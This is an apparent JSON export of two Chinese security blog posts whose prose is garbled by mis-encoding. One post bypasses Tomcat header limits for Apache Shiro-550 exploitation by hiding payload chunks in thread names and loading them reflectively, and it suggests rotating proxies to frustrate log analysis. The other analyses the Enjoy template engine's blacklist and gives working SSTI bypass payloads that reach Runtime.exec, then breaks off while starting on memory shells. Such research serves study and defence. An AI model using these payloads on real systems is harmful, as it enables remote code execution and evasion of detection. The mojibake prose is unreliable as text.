´","date":"2022-04-14T07:00:55.000Z","updated":"2024-08-04T09:01:49.316Z","comments":true,"path":"2022/04/14/year/2022/4/æµ…è°ˆShiro550å—Tomcat-Headeré•¿åº¦é™åˆ¶å½±å“çªç ´/","link":"","permalink":"https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/","excerpt":"","text":"æµ…è°ˆShiro550å—Tomcat Headeré•¿åº¦é™åˆ¶å½±å“çªç ´0x00 å†™åœ¨å‰é¢å†™ä¸ªshiroç›¸å…³çš„ä¸œè¥¿ï¼Œè¿˜æ˜¯ç§‰ç€å†™å‡ºæ¥æ‰èƒ½å­¦çš„æ›´å¤šçš„ç†å¿µï¼Œå½“ç„¶ä¸ªäººè¿˜æ˜¯ä¸å¤ªå–œæ¬¢è´´ä¸Šæ•´ä¸²ä»£ç ï¼Œåªæ˜¯åˆ†äº«æ€è·¯å¿ƒå¾—ï¼Œåœ¨å¾ˆæ—©ä»¥å‰æˆ‘å­¦ä¹ è¿™ä¸ªåªæ˜¯æƒ³å¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†æ˜¯åé¢è‡ªå·±è¿˜æ˜¯æ›´å–œæ¬¢æŠ˜è…¾å®æˆ˜æ–¹é¢çš„ä¸€äº›æ„æ€(è™½ç„¶æ²¡æœ‰è¿‡)ï¼Œåœ¨å®æˆ˜ä¸­æˆ‘ä»¬æ›´å¸Œæœ›å¾—åˆ°ä¸€ä¸ªæœ‰å›æ˜¾çš„ï¼Œè€Œä¸æ˜¯åªæ˜¯æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå…³äºå›æ˜¾æœ€é€šç”¨çš„å°±æ˜¯å»éå†çº¿ç¨‹å¯¹è±¡ä¸­è·å–requestï¼Œä½†æ˜¯åé¢å‘ç°Tomcatå±…ç„¶æœ‰Headeré•¿åº¦çš„é™åˆ¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è§£å†³é—®é¢˜ 0x01 ä¸€äº›ä¼ ç»Ÿæ€è·¯æ€è·¯ä¸€ï¼šä¿®æ”¹maxHeaderSize(ä¸å¤ªå–œæ¬¢)é¦–å…ˆæ˜¯åœ¨ç½‘ä¸Šå‚è€ƒå­¦ä¹ åˆ°äº†Litch1å†™çš„æ–‡ç« åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶ é‡Œé¢æåˆ°äº†å»ä¿®æ”¹org.apache.coyote.http11.AbstractHttp11Protocolä¸­çš„maxHeaderSizeçš„å€¼ï¼Œé‡Œé¢é€šè¿‡å¤šä¸ªçº¿ç¨‹å‘é€payloadæ¥ç¡®ä¿requestçš„inputbufferä¼šå¤ç”¨ï¼Œä¸ªäººè§‰å¾—ä¸å¤ªç¨³å®šï¼Œå¦ä¸€æ–¹é¢å°±ç®—æ„é€ å‡ºæ¥äº†å…¶å®ä¹Ÿå¾ˆé•¿äº†ï¼Œåœ¨æˆ‘å¿ƒä¸­ä¸æ˜¯æœ€ä¼˜è§£ æ€è·¯äºŒï¼šåˆ†ç¦»payload+åŠ¨æ€ç±»åŠ è½½ è¿™ä¸ªæ€è·¯ä¸»è¦æ¥æºäºè¯»åˆ°å¼€æºå·¥å…·ShiroAttack2é‡Œé¢æåˆ°çš„å°†payloadåˆ†ç¦»ä¸ºä¸¤ä¸ªéƒ¨åˆ†(ä¸€éƒ¨åˆ†æ˜¯å»è§¦å‘ååºåˆ—åŒ–Gadgetï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯)ï¼Œæˆ‘çš„ç¯å¢ƒæ˜¯tomcat8(å› æ­¤éœ€è¦éå†çº¿ç¨‹å¯¹è±¡è·å–request/responseä¾¿äºå›æ˜¾) è¿™é‡Œä¸€ä¸ªæ¯”è¾ƒéªšçš„ç‚¹æ˜¯é€šè¿‡Classè‡ªå¸¦çš„æ–¹æ³•equalså»ä¼ é€’requestä¸responseï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„ï¼Œè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿ è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸå®ç°äº†å°†payloadç¼©çŸ­èƒ½è·å¾—å›æ˜¾çš„ç›®çš„äº† 0x02 æµ…è°ˆæ–°æ€è·¯ä½†æ˜¯å‘¢ï¼Œä¸ªäººå¹¶ä¸æ»¡è¶³ä»…ä»…åªæ˜¯æˆåŠŸï¼Œå¦‚æœæŸä¸€å¤©åœ¨æŸäº›æ¡†æ¶ä¸‹è®©headeræ›´çŸ­æ€ä¹ˆåŠï¼Ÿè¿™é‡Œæˆ‘ä¸»è¦è§£å†³ä¸è½åœ°çš„æ€è·¯ èƒ½ä¸èƒ½å†å°†ä¸Šé¢çš„æ€è·¯äºŒå†åˆ†ç¦»å¼€æ¥æ¥ç®€å•å®ç°ç¼©çŸ­payload+åˆ†æ•£å‘åŒ… è¦è§£å†³è¿™ä¸ªé‚£ä¹ˆä¸€å®šè¦è§£å†³åœ¨å…¨å±€èƒ½å¤ŸæŒä¹…å­˜å‚¨æˆ‘ä»¬çš„payloadçš„åœ°æ–¹ï¼Œè¿™é‡Œæˆ‘æƒ³åˆ°äº†å»ä¿®æ”¹å½“å‰çº¿ç¨‹å¯¹è±¡çš„åå­—(Thread.currentThread().setName())ï¼Œæµ‹è¯•äº†ä¸‹Threadçš„nameèƒ½å¤Ÿæœ‰è¶³å¤Ÿå‚¨å­˜æˆ‘ä»¬é•¿åº¦çš„èƒ½åŠ› ç»è¿‡ç®€å•æµ‹è¯•å‘ç°æ¯æ¬¡åˆ·æ–°ç½‘é¡µè¿™ä¸ªçº¿ç¨‹éƒ½ä¼šæ”¹å˜ï¼Œä½†æ€»é‡å°±é‚£ä¹ˆå‡ ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šéœ€è¦é€šè¿‡éå†æ¥ç­›é€‰ å½“ç„¶ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å…ˆå°†å…¶ä¸­ä¸€ä¸ªè®¾ç½®æˆæˆ‘çš„id:Thread.currentThread().setName(â€œy4tackerâ€); 1234567try &#123; ThreadGroup a = Thread.currentThread().getThreadGroup(); java.lang.reflect.Field v2 = a.getClass().getDeclaredField(&quot;threads&quot;); v2.setAccessible(true); Thread[] o = (Thread[]) v2.get(a); for(int i = 0; i &lt; o.length; ++i) &#123;Thread z = o[i];if (z.getName().contains(&quot;y4tacker&quot;))&#123;z.setName(z.getName()+&quot;æˆ‘æ˜¯æ³¨å…¥çš„payload&quot;); &#125;&#125;&#125;catch (Exception e)&#123;&#125; é€šè¿‡ä¸€äº›å…¶ä»–æ‰‹æ®µç¼©å‡payloadè‡³æœ€å°å·®ä¸å¤š2400 è¿™æ ·æˆ‘ä»¬åªéœ€è¦å°†æ³¨å…¥çš„payloadåˆ†æˆå¤šæ®µæ…¢æ…¢åŠ å…¥ï¼Œé€šè¿‡ä¸‹é¢çš„ä»£ç æ¥æœ€ç»ˆè§¦å‘æˆ‘ä»¬è®¾ç½®å‘çº¿ç¨‹çš„paylaodæ‰§è¡Œä»»æ„ä»£ç äº† 123456try &#123;ThreadGroup a = Thread.currentThread().getThreadGroup();java.lang.reflect.Field v2 = a.getClass().getDeclaredField(&quot;threads&quot;);v2.setAccessible(true);Thread[] o = (Thread[]) v2.get(a);for(int i = 0; i &lt; o.length; ++i) &#123;Thread z = o[i];if (z.getName().contains(&quot;y4&quot;))&#123; byte[] x = org.apache.shiro.codec.Base64.decode(z.getName().replaceAll(&quot;y4tacker&quot;, &quot;&quot;)); java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); ((Class)defineClassMethod.invoke(a.class.getClassLoader(), x, 0, x.length)).newInstance();&#125;&#125;&#125;catch (Exception e)&#123;&#125; è¿™æ ·è¿˜ç»™æˆ‘ä»¬ä¸€ä¸ªå¥½å¤„å°±æ˜¯ï¼Œåœ¨æ¯æ¬¡å‘åŒ…çš„æ—¶å€™åˆ‡æ¢ä»£ç†å˜æ›´ipï¼Œmaybeå¯ä»¥å¯¼è‡´åå°åˆ†ææ—¥å¿—çš„æ—¶å€™ä¼šæ›´éš¾(æ¯•ç«Ÿæ¯æ¬¡å‘åŒ…ä¹‹é—´æ€»æœ‰å…¶ä»–ç”¨æˆ·çš„æ­£å¸¸æ“ä½œXD)ï¼Œç®€å•æµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½å¼¹ä¸ªè®¡ç®—å™¨å˜ï¼Œç­”æ¡ˆæ°¸è¿œæ˜¯Yes é¡ºä¾¿æé†’ä¸€å¥æå®Œäº†è®°å¾—æŠŠçº¿ç¨‹åæ”¹å›å»å“¦ï¼Œä¸ç„¶çº¿ç¨‹åå˜æˆå•¥æ ·å‹’ï¼Œplz","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Shiro","slug":"Shiro","permalink":"https://y4tacker.github.io/tags/Shiro/"}]},{"title":"Enjoyæ¨¡æ¿å¼•æ“åˆ†æ","slug":"year/2022/4/Enjoyæ¨¡æ¿å¼•æ“åˆ†æ","date":"2022-04-14T04:15:23.000Z","updated":"2024-08-04T09:01:49.259Z","comments":true,"path":"2022/04/14/year/2022/4/Enjoyæ¨¡æ¿å¼•æ“åˆ†æ/","link":"","permalink":"https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/","excerpt":"","text":"Enjoyæ¨¡æ¿å¼•æ“åˆ†æå‰ç½®é¦–å…ˆæœ‰å…³Enjoyæ¨¡æ¿å¼•æ“çš„ä¸€äº›æè¿°å¯ä»¥çœ‹è¿™é‡Œï¼šhttps://jfinal.com/doc/6-1 æ–‡æ¡£ä¸­å€¼å¾—å…³æ³¨çš„ç‚¹å±æ€§è®¿é—®è§¦å‘getæ–¹æ³•åœ¨å®˜æ–¹æ–‡æ¡£é‡Œé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šæœ‰è¶£çš„ä¸œè¥¿(å½“ç„¶æˆ‘ä¼šæ›´å…³æ³¨äºä¸€äº›ç›¸å…³çš„)ï¼Œæ¯”å¦‚å±æ€§è®¿é—®çš„è¿™ä¸€æ¡æè¿°ï¼Œå¯ä»¥è®©æˆ‘ä»¬å»è§¦å‘å¯¹è±¡çš„getæ–¹æ³•(å‰ææ˜¯publicä¿®é¥°) 12345ç”±äºæ¨¡æ¿å¼•æ“çš„å±æ€§å–å€¼è¡¨è¾¾å¼æä¸ºå¸¸ç”¨ï¼Œæ‰€ä»¥å¯¹å…¶åœ¨ç”¨æˆ·ä½“éªŒä¸Šè¿›è¡Œäº†ç¬¦åˆç›´è§‰çš„æ‰©å±•ï¼Œfield è¡¨è¾¾å¼å–å€¼ä¼˜å…ˆæ¬¡åºï¼Œä»¥ user.name ä¸ºä¾‹ï¼šå¦‚æœ user.getName() å­˜åœ¨ï¼Œåˆ™ä¼˜å…ˆè°ƒç”¨å¦‚æœ user å…·æœ‰ public ä¿®é¥°è¿‡çš„name å±æ€§ï¼Œåˆ™å– user.name å±æ€§å€¼ï¼ˆæ³¨æ„ï¼šjfinal 4.0 ä¹‹å‰è¿™æ¡è§„åˆ™çš„ä¼˜å…ˆçº§æœ€ä½ï¼‰ æ–¹æ³•è°ƒç”¨å…³äºæ–¹æ³•è°ƒç”¨ä¹Ÿæœ‰ä¸€äº›æè¿°ï¼Œè¯´å¯ä»¥ç›´æ¥è°ƒç”¨å¯¹è±¡ä¸Šçš„ä»»ä½•publicæ–¹æ³•ï¼Œä½¿ç”¨è§„åˆ™ä¸javaä¸­è°ƒç”¨æ–¹å¼ä¿æŒä¸€è‡´ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯æ‰€æœ‰æ–¹æ³•éƒ½èƒ½è°ƒç”¨ï¼Œåœ¨æºç çš„è°ƒè¯•è¿‡ç¨‹å½“ä¸­å‘ç°æœ‰ä¸€äº›æ–¹æ³•åœ¨é»‘åå•å½“ä¸­ 1234567891011121314151617getClasswaitnotifyAllgetClassLoaderinvokenotifygetDeclaringClassremoveForbiddenMethodremoveForbiddenClasssuspendresumeloadLibraryforNamenewInstanceexithaltstop é™¤æ­¤ä»¥å¤–ä¹Ÿæœ‰é»‘åå•ç±» 123456789101112131415161718java.lang.ThreadGroupjava.lang.ProcessBuilderjava.lang.Systemjava.lang.ClassLoaderjava.lang.reflect.Proxyjava.lang.Runtimejava.lang.Threadjava.lang.Classcom.jfinal.template.expr.ast.MethodKitjava.io.Filejava.lang.reflect.Methodjava.lang.InheritableThreadLocaljava.lang.Processjava.lang.ThreadLocaljava.lang.Packagejava.lang.SecurityManagerjava.lang.Compilerjava.lang.RuntimePermission å› æ­¤ä¹Ÿç»™äº†æˆ‘ä»¬æ›´å¤šçš„é™åˆ¶ é™æ€å±æ€§è®¿é—®æ¥ä¸ªä¾‹å­å°±æ‡‚äº† 123#if(x.status == com.demo.common.model.Account::STATUS_LOCK_ID) &lt;span&gt;(è´¦å·å·²é”å®š)&lt;/span&gt;#end é™æ€æ–¹æ³•çš„è°ƒç”¨123#if(com.jfinal.kit.StrKit::isBlank(title)) ....#end åŒæ—¶æ”¯æŒè°ƒç”¨é™æ€å±æ€§ä¸Šçš„æ–¹æ³• 1(com.jfinal.MyKit::me).method(paras) å¼•æ“æ‰§è¡Œæµç¨‹ç®€å•åˆ†æä»¥ä¸‹ä¸æ„Ÿå…´è¶£å¯ä»¥ç›´æ¥ç•¥è¿‡ï¼Œå› ä¸ºä¸éœ€è¦ä¸€äº›å¾ˆè¯¦ç»†çš„åˆ†æå°±èƒ½bypassï¼Œåªè¦æˆ‘ä»¬çŸ¥é“è¿‡æ»¤äº†å“ªäº›ç±»å“ªäº›æ–¹æ³•é’ˆå¯¹ç»•è¿‡å³å¯ï¼Œè¿™é‡Œæƒå½“è‡ªå·±å¥½å¥‡çœ‹çœ‹å¦‚ä½•å®ç°çš„ï¼Œå½“ç„¶åˆ†æä¹Ÿåªä¼šä¸»è¦å»çœ‹ä¸€äº›èƒ½è®©æˆ‘æˆåŠŸå®ç°æ‰§è¡Œä¸å®‰å…¨å‡½æ•°çš„æ–¹å¼(æŒ‡çš„æ˜¯#()ä¸#set()ä¸¤ç§)ï¼Œæ ¹æ®å¯¹æ–‡æ¡£çš„é˜…è¯»ï¼Œä¸ªäººè®¤ä¸ºå…¶ä»–æ ‡ç­¾å¯¹äºæˆ‘æ„ä¹‰ä¸å¤§ï¼Œå› ä¸ºæˆ‘å¦‚æœèƒ½å¤Ÿæ‰§è¡Œä¸€ä¸ªå‘½ä»¤æˆ‘éœ€è¦çš„æ˜¯èƒ½å¤Ÿå›æ˜¾#()ï¼Œæˆ–è€…æˆ‘ä¸èƒ½é€šè¿‡ä¸€æ­¥æ‰§è¡Œéœ€è¦é€šè¿‡#set(a=xxx)çš„æ–¹å¼å»æ‹†åˆ†ä¿å­˜å˜é‡åšä¸­è½¬ï¼Œå› æ­¤æˆ‘åœ¨åˆ†æè°ƒè¯•çš„è¿‡ç¨‹å½“ä¸­åªä¼šé’ˆå¯¹è¿™ä¸¤ä¸ªæ ‡ç­¾è¿›è¡Œåˆ†æ ä¸ºäº†ç‹¬ç«‹åˆ†æè¿™é‡Œå¼•å…¥äº†mavenåæ ‡ 12345&lt;dependency&gt; &lt;groupId&gt;com.jfinal&lt;/groupId&gt; &lt;artifactId&gt;enjoy&lt;/artifactId&gt; &lt;version&gt;4.9.21&lt;/version&gt;&lt;/dependency&gt; ä¸€ä¸ªåŸºæœ¬çš„ä½¿ç”¨å¾ˆç®€å•ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•æˆ‘å†™äº†ä¸ªå¾ˆç®€å•çš„ç±» 123456789101112package com.example.ezsb;public class User &#123; public static void run()&#123; try&#123; Runtime.getRuntime().exec(&quot;open -na Calculator&quot;); &#125;catch (Exception e)&#123; &#125; &#125;&#125; 12Template template = engine.getTemplateByString(&quot;#(com.example.ezsb.User::run())&quot;);template.renderToString(); é¦–å…ˆç”±äºé»˜è®¤æœªå¼€å¯ç¼“å­˜ï¼Œé»˜è®¤èµ°ç¬¬ä¸€ä¸ªåˆ†æ”¯ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹com.jfinal.template.Engine#buildTemplateBySource,åŒæ ·æˆ‘ä»¬åªéœ€è¦æ›´å…³æ³¨äºè§£æéƒ¨åˆ†ä¹Ÿå°±æ˜¯parser.parse() æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆè·Ÿä¸€ä¸‹è¿™ä¸ªéå†å­—ç¬¦ä¸²è§£ætokençš„è¿‡ç¨‹ï¼Œé¦–å…ˆæ˜¯åˆæ­¥è§£ææ“ä½œä¸å†…å®¹ï¼Œæ¯”å¦‚#(xxx)ä»–å°±ä¼šè¯†åˆ«æˆOUTPUT xxxx )ä¸‰éƒ¨åˆ†ï¼Œ#set(&quot;a=xxx&quot;)ä¹Ÿä¼šæ‹†åˆ†æˆset a=xxx )ä¸‰éƒ¨åˆ†ä¹‹ååœ¨statlistä¸­ï¼Œæ ¹æ®æ˜¯TEXT\\SET\\FOR\\OUTPUT\\INCLUDE\\FOR\\DEFINE\\CALL.....ç­‰å»åšæ›´è¿›ä¸€æ­¥çš„è§£æ è¿™é‡Œæˆ‘ä»¬çœ‹çœ‹,é¦–å…ˆå½“å‰ä½ç½®ä¸€å®šæ˜¯#ï¼Œä¸ç„¶ä¹Ÿæ²¡æ„ä¹‰äº†ï¼Œè¿™é‡Œå…‰çœ‹è‹±æ–‡å•è¯å°±çŸ¥é“æˆ‘ä»¬æ›´åº”è¯¥ä¸“æ³¨çœ‹com.jfinal.template.stat.Lexer#scanDire è¿™é‡Œå¦‚æœ#åé¢æ˜¯(ä¹Ÿå°±ç›´æ¥å¯¹åº”äº†OUTPUTï¼Œå¦‚æœä¸æ˜¯åˆ™åˆ¤æ–­åé¢å¦‚æœæ˜¯å­—æ¯åˆ™è½¬åˆ°stateä¸º10çš„åˆ†æ”¯ï¼ˆPSï¼šåé¢é‚£ä¸ªå¦‚æœæ˜¯@åˆ™è°ƒç”¨æ¨¡æ¿å‡½æ•°é˜²æ­¢ä½ ä»¬å¥½å¥‡ï¼‰ï¼Œå¹¶è®¾ç½®å¯¹åº”çš„token æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹stateä¸º10çš„åœ°æ–¹åšçš„ä»€ä¹ˆé¦–å…ˆé€šè¿‡idå»è·å–symbol ç®€å•çœ‹çœ‹è¿™é‡Œä¸€äº›å†…ç½®çš„ä¸œè¥¿ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å°±ä¼šå»çœ‹æ˜¯ä¸æ˜¯èµ°defineæˆ–è€…else ifåˆ†æ”¯ï¼Œå½“ç„¶è¶…çº²äº†æˆ‘ä¸Šé¢è¯´è¿‡çš„åªçœ‹#()å’Œ#set()ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥è°ˆäº† æ¥ä¸‹æ¥çœ‹debugçª—å£å°±å’Œæˆ‘ä»¬ä¸Šé¢è¯´çš„ä¸€æ ·è®¾ç½®äº†ä¸‹é¢çš„toknelistçš„å†…å®¹ æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­çœ‹çœ‹statListå‡½æ•°(åœ¨ä¸Šä¸€æ­¥çš„åŸºç¡€ä¸Šè¿›è¡Œæ›´è¿›ä¸€æ­¥çš„è§£æ)ï¼Œè¿™é‡Œä¸ç®¡æ˜¯OUTPUTè¿˜æ˜¯SETå…¶å®å€¼å¾—æˆ‘ä»¬å…³æ³¨çš„æ ¸å¿ƒè°ƒç”¨æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯this.parseExprList(para) è·Ÿè¿›parseExprListï¼Œä¸€ç›´åˆ°com.jfinal.template.expr.ExprParser#parseï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªscan è¿™é‡Œä¸å†é€šç¯‡åƒä¸Šé¢é‚£æ ·è¯´å¦‚ä½•è§£æçš„äº†ï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªå·±çœ‹ è¿™é‡Œæˆ‘ä»¬åªçœ‹å‡ ä¸ªå…³é”®çš„ï¼Œåœ¨scanOperatoré‡Œé¢ï¼Œä¸€ä¸ªæ˜¯::ä½œä¸ºSTATICé™æ€æ ‡è®°ï¼Œå¦ä¸€ä¸ªæ˜¯å·¦æ‹¬å·å’Œåˆæ‹¬å· åœ¨æœ€ç»ˆåšå®Œè¿™äº›å¤„ç†åï¼ŒtokenListæˆäº†è¿™ä¸ªæ ·å­ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢ï¼Œé¦–å…ˆinitPeekä¼šå°†peekè®¾ç½®ä¸ºtokenListå½“ä¸­çš„ç¬¬ä¸€ä¸ªï¼Œä¹‹åé»˜è®¤ä¼šè°ƒç”¨exprList 123456789101112131415Expr parse(boolean isExprList) &#123; this.tokenList = (new ExprLexer(this.paraToken, this.location)).scan(); if (this.tokenList.size() == 0) &#123; return ExprList.NULL_EXPR_LIST; &#125; else &#123; this.tokenList.add(EOF); this.initPeek(); Expr expr = isExprList ? this.exprList() : this.forCtrl(); if (this.peek() != EOF) &#123; throw new ParseException(&quot;Expression error: can not match \\&quot;&quot; + this.peek().value() + &quot;\\&quot;&quot;, this.location); &#125; else &#123; return (Expr)expr; &#125; &#125;&#125; åœ¨exprList,å…·ä½“çš„è¿‡ç¨‹ä¹Ÿæ¯”è¾ƒå¤æ‚ 12345678910111213141516171819202122ExprList exprList() &#123; ArrayList exprList = new ArrayList(); while(true) &#123; Expr expr = this.expr(); if (expr == null) &#123; break; &#125; exprList.add(expr); if (this.peek().sym != Sym.COMMA) &#123; break; &#125; this.move(); if (this.peek() == EOF) &#123; throw new ParseException(&quot;Expression error: can not match the char of comma &#x27;,&#x27;&quot;, this.location); &#125; &#125; return new ExprList(exprList); &#125; è¿™é‡Œæ”¾ä¸€ä¸ªè°ƒç”¨æ ˆå°±å¥½äº†ï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªå·±è·Ÿä¸€è·Ÿ(å®ƒè§„å®šäº†ä»¥ä»€ä¹ˆæ ·çš„é¡ºåºå»è§£ææˆ‘ä»¬çš„è¡¨è¾¾å¼) 123456789101112131415161718192021222324staticMember:326, ExprParser (com.jfinal.template.expr)incDec:287, ExprParser (com.jfinal.template.expr)unary:279, ExprParser (com.jfinal.template.expr)nullSafe:253, ExprParser (com.jfinal.template.expr)mulDivMod:241, ExprParser (com.jfinal.template.expr)addSub:229, ExprParser (com.jfinal.template.expr)greaterLess:216, ExprParser (com.jfinal.template.expr)equalNotEqual:203, ExprParser (com.jfinal.template.expr)and:191, ExprParser (com.jfinal.template.expr)or:179, ExprParser (com.jfinal.template.expr)ternary:165, ExprParser (com.jfinal.template.expr)assign:158, ExprParser (com.jfinal.template.expr)expr:127, ExprParser (com.jfinal.template.expr)exprList:110, ExprParser (com.jfinal.template.expr)parse:97, ExprParser (com.jfinal.template.expr)parseExprList:76, ExprParser (com.jfinal.template.expr)parseExprList:269, Parser (com.jfinal.template.stat)stat:117, Parser (com.jfinal.template.stat)statList:87, Parser (com.jfinal.template.stat)parse:77, Parser (com.jfinal.template.stat)buildTemplateBySource:305, Engine (com.jfinal.template)getTemplateByString:242, Engine (com.jfinal.template)getTemplateByString:223, Engine (com.jfinal.template)main:50, Test (com.example.ezsb) æœ€ç»ˆåœ¨staticMemberä¼šè¿”å›ä¸€ä¸ªå®ä¾‹åŒ–çš„staticMemberå¯¹è±¡ åœ¨åˆå§‹åŒ–çš„æ—¶å€™è¿˜ä¼šæ£€æŸ¥ç±»åä¸æ–¹æ³•åæ˜¯å¦åœ¨é»‘åå•å½“ä¸­ï¼Œå…·ä½“çš„åœ¨ä¸Šé¢æåˆ°è¿‡å°±ä¸è´´äº†ç‚¹æˆ‘ç›´è¾¾ åé¢è¿‡ç¨‹å°±çœç•¥äº†ï¼Œå·²ç»åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„äº†ï¼Œåé¢å°±æ˜¯å¦‚ä½•è°ƒç”¨è¿™ä¸ªé™æ€å‡½æ•°äº†ï¼Œå½“ç„¶å…¶å®ä¸æ­¢èƒ½è°ƒç”¨é™æ€æ–¹æ³•ï¼Œè¿˜å¯ä»¥ç›´æ¥è°ƒç”¨å®ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼Œä½†æ˜¯ä¹Ÿæ˜¯æœ‰é»‘åå•æ‹¦æˆª ç»•è¿‡Bypassæ ¹æ®ä¹‹å‰çš„è°ƒè¯•æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæƒ³è¦åœ¨æ¨¡æ¿é‡Œé¢æ‰§è¡Œå‡½æ•°æœ‰å‡ ä¸ªæ¡ä»¶ å¯¹äºè°ƒç”¨é™æ€æ–¹æ³•ï¼Œåªèƒ½è°ƒç”¨å…¬å…±é™æ€æ–¹æ³•(ä½†ä¸èƒ½ç”¨é»‘åå•å½“ä¸­çš„ç±»ä»¥åŠæ–¹æ³•) å¯¹äºå®ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼Œåªèƒ½è°ƒç”¨publicä¿®é¥°çš„(ä½†ä¸èƒ½ç”¨é»‘åå•å½“ä¸­çš„ç±»ä»¥åŠæ–¹æ³•) ç»•è¿‡ç¬¬ä¸€ä¸ªæ–¹å¼ç›´æ¥å‘½ä»¤æ‰§è¡Œæ¯”è¾ƒéš¾ï¼Œé‚£ä¹ˆå¦‚æœæ˜¯ç¬¬äºŒç§æ–¹å¼çš„è¯é‚£æˆ‘ä»¬è‚¯å®šéœ€è¦è·å–ä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªpublicç±»çš„é™æ€æ–¹æ³•èƒ½è¿”å›æˆ‘ä»¬ä»»æ„çš„å®ä¾‹å‘¢ï¼Œé‚£å°±çœ‹çœ‹æœ‰æ²¡æœ‰åŠæ³•èƒ½å¤Ÿè¿”å›ä¸€ä¸ªç±»çš„å®ä¾‹å‘¢ï¼Ÿè¿™æ ·å°±å¯ä»¥ javax.script.ScriptEngineManageræ¥æ‰§è¡Œä»»æ„Javaä»£ç (è¿™æ ·ä¹Ÿæ¯”è¾ƒå¥½ç»•è¿‡é»‘åå•äº†) é¦–å…ˆç½‘ä¸Šæœäº†æœjfinalçš„å†å²ï¼Œå‘ç°å¯ä»¥é€šè¿‡fastjsonå»å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼ŒåŒæ—¶å¯ä»¥å¼€å¯autotypeï¼Œæ„é€ payloadé•¿è¿™æ · 1234567#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())#(x.setAutoTypeSupport(true))#(x.addAccept(&quot;javax.script.ScriptEngineManager&quot;))#set(a=com.alibaba.fastjson.JSON::parse(&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;))#set(b=a.getEngineByName(&#x27;js&#x27;))#set(payload=xxxxxx)#(b.eval(payload)) æ—¢ç„¶è¿™æ ·é‚£æœ‰æ²¡æœ‰jreå½“ä¸­çš„ç±»å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœå‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰ Javaè‡ªå¸¦ç±»ç»•è¿‡æˆ‘å‘ç°æœ‰ä¸€ä¸ªç±»java.beans.Beans 123public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException &#123; return Beans.instantiate(cls, beanName, null, null);&#125; è¿™ä¸ªæ–¹æ³•åˆè‡­åˆé•¿ï¼Œä¸è¿‡å¥½åœ¨ç¬¦åˆæ¡ä»¶classLoaderä¹Ÿä¸éœ€è¦ä¼ ï¼ŒçœŸèˆ’æœå‘€ 12345678if (cls == null) &#123; try &#123; cls = ClassLoader.getSystemClassLoader(); &#125; catch (SecurityException ex) &#123; // We&#x27;re not allowed to access the system class loader. // Drop through. &#125;&#125; å› æ­¤é…åˆè¿™ä¸ªç±»é¡ºæ‰‹æ‹¿ä¸‹æ¨¡æ¿SSTI 1#set((java.beans.Beans::instantiate(null,&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&quot;js&quot;).eval(&quot;function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\\&quot;open -na Calculator\\&quot;)&quot;)) è·å–å›æ˜¾æˆ‘ä»¬è€ƒè™‘ä¸¤ä¸ªåœºæ™¯ï¼Œä¸€ä¸ªæ˜¯ç›´æ¥æ‰§è¡Œï¼Œå¦ä¸€ä¸ªreturnè¿”å›å€¼ å†™å…¥å†…å­˜é©¬æ—¢ç„¶èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç äº†é‚£è‚¯å®šæ‹¿ä¸‹å†…å­˜é©¬ï¼Œè¿™é‡Œå¯ä¸€ä¸ªspringbootç¯å¢ƒæµ‹è¯•ï¼Œç®€å•æµ‹è¯•ä¸‹ 12345678910111213@ResponseBody@RequestMapping(&quot;/&quot;)public String abc(@RequestParam(&quot;base&quot;) String base) &#123; ProcessBuilder processBuilder = new ProcessBuilder(); Engine engine 